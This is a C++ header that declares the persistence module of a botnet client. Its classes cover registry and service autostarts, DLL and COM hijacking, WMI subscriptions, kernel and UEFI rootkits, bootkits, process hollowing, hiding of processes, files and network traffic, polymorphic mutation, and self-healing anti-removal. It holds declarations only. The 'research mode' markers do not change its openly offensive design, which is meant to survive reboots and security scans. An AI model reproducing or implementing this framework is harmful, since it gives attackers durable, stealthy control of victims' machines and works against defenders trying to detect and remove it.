#pragma once

#include <memory>
#include <string>
#include <vector>
#include <map>
#include <atomic>
#include <mutex>
#include <thread>
#include <chrono>
#include <functional>
#include <nlohmann/json.hpp>
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace persistence {

/**
 * @brief Advanced persistence framework - single codebase approach
 * 
 * Implements sophisticated persistence mechanisms that survive system
 * restarts, updates, and security scans. Works across all platforms.
 */
class AdvancedPersistence {
public:
    enum class PersistenceLevel {
        USER_LEVEL,         // User-space persistence
        SYSTEM_LEVEL,       // System-wide persistence
        KERNEL_LEVEL,       // Kernel/driver level (when possible)
        FIRMWARE_LEVEL,     // UEFI/firmware persistence
        HYPERVISOR_LEVEL,   // Hypervisor rootkit
        NETWORK_LEVEL       // Network-based persistence
    };

    enum class PersistenceMethod {
        // Traditional methods
        REGISTRY_PERSISTENCE,
        SERVICE_PERSISTENCE,
        SCHEDULED_TASK,
        STARTUP_FOLDER,
        
        // Advanced methods
        DLL_HIJACKING,
        COM_HIJACKING,
        WMI_PERSISTENCE,
        WINLOGON_HELPER,
        IFEO_PERSISTENCE,
        
        // Rootkit methods
        SYSTEM_CALL_HOOKING,
        DRIVER_INSTALLATION,
        BOOTKIT_INSTALLATION,
        UEFI_PERSISTENCE,
        
        // Cross-platform methods
        CRON_PERSISTENCE,
        SYSTEMD_PERSISTENCE,
        LAUNCHD_PERSISTENCE,
        LIBRARY_INJECTION,
        
        // Fileless methods
        MEMORY_ONLY_PERSISTENCE,
        REGISTRY_ONLY_PERSISTENCE,
        WMI_REPOSITORY_PERSISTENCE,
        
        // Research methods
        RESEARCH_MARKED_PERSISTENCE
    };

    enum class PersistenceStatus {
        NOT_INSTALLED,
        INSTALLING,
        INSTALLED,
        ACTIVE,
        DETECTED,
        REMOVED,
        FAILED,
        RESEARCH_MODE
    };

    struct PersistenceConfig {
        std::vector<PersistenceMethod> methods;
        PersistenceLevel target_level;
        bool enable_self_healing;
        bool enable_redundancy;
        bool enable_polymorphism;
        std::chrono::hours health_check_interval;
        uint32_t max_installation_attempts;
        bool research_mode;
        std::string research_session_id;
        std::vector<std::string> research_markers;
    };

    struct PersistenceInfo {
        PersistenceMethod method;
        PersistenceStatus status;
        std::chrono::system_clock::time_point installed_at;
        std::chrono::system_clock::time_point last_check;
        std::string installation_path;
        std::string backup_location;
        uint32_t detection_count;
        bool self_healing_active;
        nlohmann::json technical_details;
    };

public:
    AdvancedPersistence();
    ~AdvancedPersistence();

    // Core persistence operations
    bool Initialize(const PersistenceConfig& config);
    bool InstallPersistence();
    bool RemovePersistence();
    bool UpdatePersistence();
    bool ValidatePersistence();

    // Health monitoring and self-healing
    bool StartHealthMonitoring();
    bool StopHealthMonitoring();
    bool TriggerSelfHealing();
    bool IsHealthy() const;

    // Persistence management
    std::vector<PersistenceInfo> GetInstalledPersistence() const;
    PersistenceStatus GetMethodStatus(PersistenceMethod method) const;
    bool IsMethodActive(PersistenceMethod method) const;
    bool RemoveSpecificMethod(PersistenceMethod method);

    // Advanced features
    bool EnablePolymorphism();
    bool DisablePolymorphism();
    bool CreateBackupPersistence();
    bool RestoreFromBackup();

    // Research mode controls
    void EnableResearchMode(const std::string& session_id);
    void DisableResearchMode();
    void AddResearchMarkers();
    std::vector<std::string> GetPersistenceLogs() const;

private:
    // Forward declarations for persistence modules
    class RegistryPersistence;
    class ServicePersistence;
    class TaskPersistence;
    class DLLHijackPersistence;
    class WMIPersistence;
    class RootkitPersistence;
    class FilelessPersistence;
    class CrossPlatformPersistence;
    class PolymorphicEngine;
    class SelfHealingSystem;

    PersistenceConfig config_;
    
    // Persistence modules
    std::unique_ptr<RegistryPersistence> registry_persistence_;
    std::unique_ptr<ServicePersistence> service_persistence_;
    std::unique_ptr<TaskPersistence> task_persistence_;
    std::unique_ptr<DLLHijackPersistence> dll_hijack_persistence_;
    std::unique_ptr<WMIPersistence> wmi_persistence_;
    std::unique_ptr<RootkitPersistence> rootkit_persistence_;
    std::unique_ptr<FilelessPersistence> fileless_persistence_;
    std::unique_ptr<CrossPlatformPersistence> cross_platform_persistence_;
    std::unique_ptr<PolymorphicEngine> polymorphic_engine_;
    std::unique_ptr<SelfHealingSystem> self_healing_;
    
    // Persistence tracking
    std::map<PersistenceMethod, PersistenceInfo> persistence_info_;
    mutable std::mutex persistence_mutex_;
    
    // Health monitoring
    std::atomic<bool> health_monitoring_active_;
    std::unique_ptr<std::thread> health_monitor_thread_;
    
    // Research mode
    bool research_mode_;
    std::string research_session_id_;
    mutable std::vector<std::string> persistence_logs_;
    mutable std::mutex logs_mutex_;
    
    // Internal methods
    bool InitializeModules();
    bool InstallMethod(PersistenceMethod method);
    bool ValidateMethod(PersistenceMethod method);
    void HealthMonitorLoop();
    void UpdatePersistenceInfo(PersistenceMethod method, const PersistenceInfo& info);
    void LogPersistenceActivity(const std::string& activity);
};

/**
 * @brief Windows Registry-based persistence
 */
class AdvancedPersistence::RegistryPersistence {
public:
    enum class RegistryLocation {
        HKCU_RUN,
        HKLM_RUN,
        HKCU_RUNONCE,
        HKLM_RUNONCE,
        WINLOGON_USERINIT,
        WINLOGON_SHELL,
        SERVICES_KEY,
        IFEO_KEY,
        APPINIT_DLLS,
        LOAD_APPINIT_DLLS
    };

public:
    RegistryPersistence();
    ~RegistryPersistence();

    bool Install(const std::string& executable_path, bool research_mode = false);
    bool Remove();
    bool Validate();
    bool Update(const std::string& new_path);
    
    // Advanced registry techniques
    bool InstallInIFEO(const std::string& target_process);
    bool InstallAppInitDLL(const std::string& dll_path);
    bool ModifyWinlogonKeys();
    bool CreateServiceRegistryEntry();
    
    // Stealth techniques
    bool HideRegistryKey(const std::string& key_path);
    bool CreatePolymorphicEntry();
    bool UseAlternativeRegistryPaths();
    
    // Research mode implementation
    bool InstallResearchPersistence(const std::string& session_id);

private:
    std::vector<std::pair<RegistryLocation, std::string>> installed_entries_;
    
    bool CreateRegistryEntry(RegistryLocation location, const std::string& value_name, const std::string& value_data);
    bool DeleteRegistryEntry(RegistryLocation location, const std::string& value_name);
    bool RegistryEntryExists(RegistryLocation location, const std::string& value_name);
    std::string GetRegistryPath(RegistryLocation location);
    
    // Advanced registry manipulation
    bool ModifyRegistryPermissions(const std::string& key_path);
    bool CreateHiddenRegistryKey(const std::string& key_path);
    bool BackupRegistryKey(const std::string& key_path);
    
    // Research markers
    void AddResearchMarkers(const std::string& key_path, const std::string& session_id);
};

/**
 * @brief Advanced service-based persistence
 */
class AdvancedPersistence::ServicePersistence {
public:
    enum class ServiceType {
        STANDALONE_SERVICE,
        SHARED_SERVICE,
        KERNEL_DRIVER,
        FILESYSTEM_DRIVER,
        NETWORK_DRIVER,
        LEGACY_DRIVER
    };

    enum class ServiceStartType {
        AUTO_START,
        DEMAND_START,
        DISABLED,
        BOOT_START,
        SYSTEM_START
    };

public:
    ServicePersistence();
    ~ServicePersistence();

    bool Install(const std::string& service_name, const std::string& executable_path, bool research_mode = false);
    bool Remove();
    bool Validate();
    bool Start();
    bool Stop();
    
    // Advanced service techniques
    bool InstallAsKernelDriver(const std::string& driver_path);
    bool MasqueradeAsLegitimateService();
    bool ModifyExistingService();
    bool InstallServiceDLL();
    
    // Service manipulation
    bool ChangeServiceConfig(const std::string& service_name, ServiceStartType start_type);
    bool SetServiceDependencies(const std::string& service_name, const std::vector<std::string>& dependencies);
    bool SetServiceRecoveryOptions(const std::string& service_name);
    
    // Research mode implementation
    bool InstallResearchService(const std::string& session_id);

private:
    std::string installed_service_name_;
    ServiceType service_type_;
    
    bool CreateServiceEntry(const std::string& service_name, const std::string& executable_path, ServiceType type);
    bool DeleteServiceEntry(const std::string& service_name);
    bool ServiceExists(const std::string& service_name);
    bool IsServiceRunning(const std::string& service_name);
    
    // Service manipulation helpers
    void* OpenServiceManager();
    void* OpenServiceHandle(const std::string& service_name);
    bool ConfigureServiceSecurity(const std::string& service_name);
    
    // Research markers
    void AddResearchMarkers(const std::string& service_name, const std::string& session_id);
};

/**
 * @brief DLL hijacking and COM hijacking persistence
 */
class AdvancedPersistence::DLLHijackPersistence {
public:
    enum class HijackMethod {
        DLL_SIDE_LOADING,
        DLL_SEARCH_ORDER,
        COM_HIJACKING,
        WOW64_REDIRECTION,
        KNOWN_DLLS_BYPASS,
        MANIFEST_REDIRECTION
    };

public:
    DLLHijackPersistence();
    ~DLLHijackPersistence();

    bool Install(const std::string& target_process, const std::string& dll_path, bool research_mode = false);
    bool Remove();
    bool Validate();
    
    // DLL hijacking methods
    bool PerformDLLSideLoading(const std::string& target_exe, const std::string& dll_path);
    bool ExploitDLLSearchOrder(const std::string& target_process, const std::string& dll_name);
    bool ImplementCOMHijacking(const std::string& clsid, const std::string& dll_path);
    bool BypassKnownDLLs(const std::string& dll_name, const std::string& dll_path);
    
    // COM hijacking
    bool HijackCOMObject(const std::string& clsid, const std::string& dll_path);
    bool ModifyCOMRegistry(const std::string& clsid, const std::string& new_path);
    bool RestoreCOMObject(const std::string& clsid);
    
    // Research mode implementation
    bool InstallResearchDLLHijack(const std::string& session_id);

private:
    std::vector<std::pair<std::string, std::string>> hijacked_dlls_;
    std::vector<std::string> hijacked_com_objects_;
    
    // DLL manipulation
    bool CopyDLLToTarget(const std::string& source_dll, const std::string& target_location);
    bool CreateProxyDLL(const std::string& original_dll, const std::string& proxy_dll);
    bool ValidateDLLHijack(const std::string& target_process, const std::string& dll_name);
    
    // COM manipulation
    std::string GetCOMObjectPath(const std::string& clsid);
    bool BackupCOMObject(const std::string& clsid);
    bool RestoreCOMBackup(const std::string& clsid);
    
    // Research markers
    void AddResearchMarkers(const std::string& dll_path, const std::string& session_id);
};

/**
 * @brief WMI-based persistence mechanisms
 */
class AdvancedPersistence::WMIPersistence {
public:
    enum class WMIMethod {
        EVENT_CONSUMER,
        EVENT_FILTER,
        BINDING_INSTANCE,
        WMI_REPOSITORY,
        PERMANENT_SUBSCRIPTION,
        TEMPORARY_SUBSCRIPTION
    };

public:
    WMIPersistence();
    ~WMIPersistence();

    bool Install(const std::string& payload_path, bool research_mode = false);
    bool Remove();
    bool Validate();
    
    // WMI persistence methods
    bool CreateEventConsumer(const std::string& consumer_name, const std::string& payload);
    bool CreateEventFilter(const std::string& filter_name, const std::string& query);
    bool CreateFilterToConsumerBinding(const std::string& filter_name, const std::string& consumer_name);
    bool InstallPermanentSubscription();
    
    // WMI repository manipulation
    bool ModifyWMIRepository(const std::string& namespace_name, const nlohmann::json& data);
    bool HideWMIObject(const std::string& object_path);
    bool CreateCustomWMIProvider(const std::string& provider_name);
    
    // Research mode implementation
    bool InstallResearchWMIPersistence(const std::string& session_id);

private:
    std::vector<std::string> installed_consumers_;
    std::vector<std::string> installed_filters_;
    std::vector<std::string> installed_bindings_;
    
    // WMI manipulation helpers
    bool ConnectToWMI(const std::string& namespace_name);
    bool ExecuteWMIQuery(const std::string& query);
    bool CreateWMIObject(const std::string& class_name, const nlohmann::json& properties);
    bool DeleteWMIObject(const std::string& object_path);
    
    // WMI stealth
    bool HideFromWMIEnumeration(const std::string& object_path);
    bool EncryptWMIData(const nlohmann::json& data);
    
    // Research markers
    void AddResearchMarkers(const std::string& consumer_name, const std::string& session_id);
};

/**
 * @brief Rootkit-level persistence mechanisms
 */
class AdvancedPersistence::RootkitPersistence {
public:
    enum class RootkitLevel {
        USER_MODE_ROOTKIT,
        KERNEL_MODE_ROOTKIT,
        BOOTKIT,
        UEFI_ROOTKIT,
        HYPERVISOR_ROOTKIT
    };

    enum class HookingMethod {
        INLINE_HOOKING,
        IAT_HOOKING,
        EAT_HOOKING,
        SSDT_HOOKING,
        SHADOW_SSDT_HOOKING,
        IDT_HOOKING,
        IRP_HOOKING
    };

public:
    RootkitPersistence();
    ~RootkitPersistence();

    bool Install(RootkitLevel level, bool research_mode = false);
    bool Remove();
    bool Validate();
    
    // Hooking mechanisms
    bool InstallInlineHook(const std::string& function_name, void* hook_function);
    bool InstallIATHook(const std::string& module_name, const std::string& function_name, void* hook_function);
    bool InstallSSDTHook(uint32_t service_index, void* hook_function);
    
    // Kernel-level operations
    bool LoadKernelDriver(const std::string& driver_path);
    bool UnloadKernelDriver(const std::string& driver_name);
    bool ModifySystemServiceTable();
    
    // Bootkit operations
    bool InstallBootkit(const std::string& bootkit_path);
    bool ModifyMasterBootRecord();
    bool InstallUEFIRootkit();
    
    // Process hiding
    bool HideProcess(uint32_t process_id);
    bool UnhideProcess(uint32_t process_id);
    bool HideProcessFromTaskManager();
    
    // File hiding
    bool HideFile(const std::string& file_path);
    bool UnhideFile(const std::string& file_path);
    bool HideDirectory(const std::string& directory_path);
    
    // Network hiding
    bool HideNetworkConnection(const std::string& local_address, uint16_t local_port);
    bool HideNetworkTraffic();
    
    // Registry hiding
    bool HideRegistryKey(const std::string& key_path);
    bool HideRegistryValue(const std::string& key_path, const std::string& value_name);
    
    // Research mode implementation (simulation only)
    bool SimulateRootkitInstallation(const std::string& session_id);

private:
    RootkitLevel installed_level_;
    std::vector<std::pair<std::string, void*>> installed_hooks_;
    std::vector<uint32_t> hidden_processes_;
    std::vector<std::string> hidden_files_;
    
    // Hook management
    bool SaveOriginalFunction(const std::string& function_name, void* original_address);
    bool RestoreOriginalFunction(const std::string& function_name);
    void* GetOriginalFunction(const std::string& function_name);
    
    // Memory manipulation
    bool AllocateKernelMemory(size_t size, void** memory);
    bool ProtectMemoryRegion(void* address, size_t size, uint32_t protection);
    bool CopyToKernelMemory(void* destination, const void* source, size_t size);
    
    // Driver operations
    bool RegisterDriverCallbacks();
    bool UnregisterDriverCallbacks();
    bool InstallMinifilterDriver();
    
    // Research mode simulation
    nlohmann::json SimulateHookInstallation(HookingMethod method, const std::string& target);
    void LogRootkitActivity(const std::string& activity, bool success);
};

/**
 * @brief Fileless persistence mechanisms
 */
class AdvancedPersistence::FilelessPersistence {
public:
    enum class FilelessMethod {
        MEMORY_ONLY_PERSISTENCE,
        REGISTRY_STORAGE,
        WMI_REPOSITORY_STORAGE,
        ALTERNATE_DATA_STREAMS,
        POWERSHELL_PROFILES,
        WINDOWS_MANAGEMENT_FRAMEWORK,
        LIVING_OFF_THE_LAND
    };

public:
    FilelessPersistence();
    ~FilelessPersistence();

    bool Install(const std::string& payload, bool research_mode = false);
    bool Remove();
    bool Validate();
    
    // Fileless storage methods
    bool StoreInRegistry(const std::string& payload, const std::string& key_path);
    bool StoreInWMIRepository(const std::string& payload, const std::string& namespace_name);
    bool StoreInAlternateDataStream(const std::string& payload, const std::string& file_path);
    bool StoreInPowerShellProfile(const std::string& payload);
    
    // Memory-only persistence
    bool CreateMemoryOnlyPersistence(const std::string& payload);
    bool InjectIntoSystemProcess(const std::string& payload);
    bool CreateHollowProcess(const std::string& target_process, const std::string& payload);
    
    // Living off the land techniques
    bool UseLOLBinsForPersistence(const std::string& lolbin_name, const std::string& payload);
    bool AbusePowerShellForPersistence(const std::string& payload);
    bool AbuseWMIForPersistence(const std::string& payload);
    
    // Research mode implementation
    bool InstallResearchFilelessPersistence(const std::string& session_id);

private:
    std::vector<std::pair<FilelessMethod, std::string>> storage_locations_;
    
    // Storage helpers
    bool EncodePayload(const std::string& payload, std::string& encoded_payload);
    bool DecodePayload(const std::string& encoded_payload, std::string& payload);
    bool CompressPayload(const std::string& payload, std::string& compressed_payload);
    
    // Execution helpers
    bool ExecuteFromMemory(const std::string& payload);
    bool ExecuteFromRegistry(const std::string& key_path);
    bool ExecuteFromWMI(const std::string& namespace_name);
    
    // LOLBAS (Living Off The Land Binaries and Scripts)
    std::vector<std::string> GetLOLBinsList();
    bool ValidateLOLBin(const std::string& lolbin_name);
    std::string GenerateLOLBinCommand(const std::string& lolbin_name, const std::string& payload);
    
    // Research markers
    void AddResearchMarkers(const std::string& storage_location, const std::string& session_id);
};

/**
 * @brief Cross-platform persistence mechanisms
 */
class AdvancedPersistence::CrossPlatformPersistence {
public:
    CrossPlatformPersistence();
    ~CrossPlatformPersistence();

    bool Install(const std::string& executable_path, bool research_mode = false);
    bool Remove();
    bool Validate();
    
    // Linux persistence
    bool InstallLinuxCronJob(const std::string& executable_path);
    bool InstallLinuxSystemdService(const std::string& executable_path);
    bool InstallLinuxInitScript(const std::string& executable_path);
    bool ModifyLinuxShellProfile(const std::string& executable_path);
    
    // macOS persistence
    bool InstallMacOSLaunchAgent(const std::string& executable_path);
    bool InstallMacOSLaunchDaemon(const std::string& executable_path);
    bool InstallMacOSLoginHook(const std::string& executable_path);
    bool ModifyMacOSShellProfile(const std::string& executable_path);
    
    // Universal Unix persistence
    bool InstallShellRCPersistence(const std::string& executable_path);
    bool InstallXDGAutostartPersistence(const std::string& executable_path);
    bool InstallLibraryInjection(const std::string& library_path);
    
    // Research mode implementation
    bool InstallResearchCrossPlatformPersistence(const std::string& session_id);

private:
    std::vector<std::pair<std::string, std::string>> installed_persistence_;
    
    // Platform detection
    bool IsLinux() const;
    bool IsMacOS() const;
    bool IsUnix() const;
    
    // Linux helpers
    std::string GetLinuxCronTab();
    bool SetLinuxCronTab(const std::string& crontab_content);
    std::string GenerateSystemdServiceFile(const std::string& executable_path);
    
    // macOS helpers
    std::string GenerateLaunchAgentPlist(const std::string& executable_path);
    std::string GenerateLaunchDaemonPlist(const std::string& executable_path);
    std::string GetMacOSLaunchAgentsDirectory();
    
    // Universal helpers
    std::vector<std::string> GetShellProfilePaths();
    bool ModifyShellProfile(const std::string& profile_path, const std::string& command);
    
    // Research markers
    void AddResearchMarkers(const std::string& persistence_file, const std::string& session_id);
};

/**
 * @brief Polymorphic engine for dynamic persistence
 */
class AdvancedPersistence::PolymorphicEngine {
public:
    PolymorphicEngine();
    ~PolymorphicEngine();

    bool Initialize();
    std::string GeneratePolymorphicPersistence(const std::string& base_persistence);
    std::string MutateExistingPersistence(const std::string& current_persistence);
    
    // Code mutation techniques
    std::string ApplyJunkCodeInsertion(const std::string& code);
    std::string ApplyInstructionReordering(const std::string& code);
    std::string ApplyRegisterRenaming(const std::string& code);
    std::string ApplyDeadCodeElimination(const std::string& code);
    
    // Persistence mutation
    std::string MutateRegistryEntries(const std::string& registry_script);
    std::string MutateServiceConfiguration(const std::string& service_config);
    std::string MutateTaskSchedulerEntries(const std::string& task_config);
    
    // Research mode implementation
    std::string GenerateResearchPolymorphicCode(const std::string& session_id);

private:
    std::mt19937 random_generator_;
    
    // Mutation algorithms
    std::string InsertRandomJunkCode(const std::string& code, uint32_t insertion_points);
    std::string ShuffleInstructions(const std::string& code);
    std::string RenameVariables(const std::string& code);
    std::string ObfuscateStrings(const std::string& code);
    
    // Configuration mutation
    std::string RandomizeRegistryKeyNames(const std::string& registry_script);
    std::string RandomizeServiceNames(const std::string& service_config);
    std::string RandomizeTaskNames(const std::string& task_config);
    
    // Research tracking
    void LogPolymorphicGeneration(const std::string& technique, const std::string& result_hash);
};

/**
 * @brief Self-healing and recovery system
 */
class AdvancedPersistence::SelfHealingSystem {
public:
    SelfHealingSystem();
    ~SelfHealingSystem();

    bool Initialize(const PersistenceConfig& config);
    bool StartSelfHealing();
    bool StopSelfHealing();
    bool TriggerEmergencyRecovery();
    
    // Detection and recovery
    bool DetectPersistenceRemoval();
    bool DetectProcessTermination();
    bool DetectFileModification();
    bool RecoverFromDetection();
    
    // Redundancy management
    bool CreateBackupPersistence();
    bool ActivateBackupPersistence();
    bool SynchronizePersistenceMethods();
    
    // Anti-removal techniques
    bool ImplementAntiRemoval();
    bool CreateDecoyPersistence();
    bool ProtectCriticalFiles();
    
    // Research mode implementation
    bool ExecuteResearchSelfHealing(const std::string& session_id);

private:
    std::atomic<bool> self_healing_active_;
    std::unique_ptr<std::thread> healing_thread_;
    PersistenceConfig config_;
    
    // Detection methods
    bool MonitorFileSystem();
    bool MonitorRegistry();
    bool MonitorServices();
    bool MonitorProcesses();
    
    // Recovery methods
    bool RestorePersistenceMethod(PersistenceMethod method);
    bool RecreateRemovedFiles();
    bool RestoreRegistryEntries();
    bool RestartServices();
    
    // Backup management
    bool CreatePersistenceBackup();
    bool ValidateBackupIntegrity();
    bool RestoreFromBackup();
    
    // Research logging
    void LogSelfHealingActivity(const std::string& activity, bool success);
};

} // namespace persistence
} // namespace client
} // namespace botnet
